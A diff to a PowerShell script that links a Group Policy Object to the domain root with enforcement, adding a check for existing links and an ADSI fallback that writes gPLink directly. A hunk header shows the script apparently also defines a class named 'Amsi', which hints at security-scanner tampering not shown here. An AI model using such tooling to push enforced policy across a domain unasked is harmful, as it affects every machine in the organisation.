@@ -16,6 +16,9 @@ param(
     [string]$Domain = (Get-ADDomain).DNSRoot
 )
 
+# Get domain distinguished name for GPO linking
+$DomainDN = (Get-ADDomain).DistinguishedName
+
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
@@ -199,24 +202,43 @@ public class Amsi
 Write-Host ""
 Write-Host "[*] Linking GPO and forcing update..." -ForegroundColor Yellow
 
+# Check if GPO is already linked to the domain root
+$alreadyLinked = $false
 try {
-    # Use New-GPLink to link the GPO to the domain root
-    New-GPLink -Name $GpoName -Target $Domain -LinkEnabled Yes -Enforce Yes -ErrorAction Stop
-} catch {
-    Write-Warning "New-GPLink failed, attempting ADSI fallback: $_"
-    try {
-        $domainDN = (Get-ADDomain).DistinguishedName
-        $domainObj = [adsi]"LDAP://$domainDN"
-        $currentLinks = $domainObj.Get("gPLink")
-        $newLink = "<LDAP://CN={$gpoId},CN=Policies,CN=System,$domainDN>;2"
-        if ([string]::IsNullOrEmpty($currentLinks)) {
-            $domainObj.Put("gPLink", $newLink)
-        } else {
-            $domainObj.Put("gPLink", "$currentLinks$newLink")
+    $existingLinks = Get-GPInheritance -Target $DomainDN -ErrorAction Stop
+    foreach ($link in $existingLinks.GpoLinks) {
+        if ($link.DisplayName -eq $GpoName) {
+            $alreadyLinked = $true
+            break
         }
-        $domainObj.SetInfo()
+    }
+} catch {
+    # Get-GPInheritance may fail on some configs, proceed to try linking
+}
+
+if ($alreadyLinked) {
+    Write-Host "LINKED (already exists)" -ForegroundColor Cyan
+} else {
+    try {
+        New-GPLink -Name $GpoName -Target $DomainDN -LinkEnabled Yes -Enforce Yes -ErrorAction Stop
+        Write-Host "LINKED" -ForegroundColor Green
     } catch {
-        Write-Warning "ADSI link also failed: $_"
+        Write-Warning "New-GPLink failed, attempting ADSI fallback: $_"
+        try {
+            $domainObj = [adsi]"LDAP://$DomainDN"
+            $currentLinks = $domainObj.Get("gPLink")
+            $newLink = "[LDAP://CN={$gpoId},CN=Policies,CN=System,$DomainDN;0]"
+            if ([string]::IsNullOrEmpty($currentLinks)) {
+                $domainObj.Put("gPLink", $newLink)
+            } else {
+                $domainObj.Put("gPLink", "$currentLinks$newLink")
+            }
+            $domainObj.SetInfo()
+            Write-Host "LINKED (via ADSI)" -ForegroundColor Green
+        } catch {
+            Write-Warning "ADSI link also failed: $_"
+            Write-Host "LINK FAILED - check permissions and domain connectivity" -ForegroundColor Red
+        }
     }
 }
 
